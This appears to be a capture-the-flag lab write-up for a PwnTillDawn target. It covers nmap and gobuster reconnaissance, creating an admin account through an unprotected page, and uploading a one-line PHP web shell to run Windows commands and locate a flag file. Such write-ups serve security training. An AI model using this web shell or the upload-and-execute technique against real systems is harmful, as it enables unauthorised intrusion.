# Pwntilldawn-Lab3
1. Looking for ip
   `nmap -sn 10.150.150.0/24` 
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/b02f18d8ccc71979ce958a7433e7e6822b9eb294/0.png)
   
   or even better do this `nmap -p 80,21,22,445 10.150.150.0/24`)<br/>
Note this for:<br/>
  This tells Nmap to ONLY scan specific ports instead of all ports: <br/>
80 → HTTP (web server)
21 → FTP (file transfer)
22 → SSH (remote login)
445 → SMB (Windows file sharing)
![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/fdce028dfbcf331ed5677020d69270c1c3c50a15/1.png)

Doing 10.150.150.11 <br/>
Has 
| Service  |  State 
| ------------- | ------------- |
| ftp | Close  | 
| ssh  | Close  |
| http  | Close  |
| microsoft-ds  | Close  | <br/>

 2.`gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak`
 ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/2.png)
 ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/3.png)

Has several HTTP links we can try to access<br>

 3. i. /Admin<br/>
    ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/4.png)

   ii. /upload<br/>
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/5.png)

4. Inside http://10.150.150.11, there's a decent directory to get into, which is the addedituser.php
   Create a user with an admin role

  Extra: Access to admin account using simple tricks (Inspect Q). change type=password into type=text
  ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/6.png)

5. Create a simple webshell to run commands through the browser.
   `<?php system($_GET['cmd']); ?>` save it as "shell.php"
   Afterward, upload it to your accounts.
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/7.png)

7. Force uploading the files into the new folder of http://10.150.150.11/upload/12
   Reason to run the PHP file on the web.
   http://10.150.150.11/upload/12/shell.php
   http://10.150.150.11/upload/12/shell.php?cmd=hostname
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/8.png)
   
   http://10.150.150.11/upload/12/shell.php?cmd=whoami
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/9.png)

# Because we know it's a window
  http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/10.png)

   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/11.png)

   There it is. The flag file
   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop\FLAG1.txt
   ![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/689a0289a1d23ae13be1d2ecc1ce3bec52b8a57e/12.png)

 
 
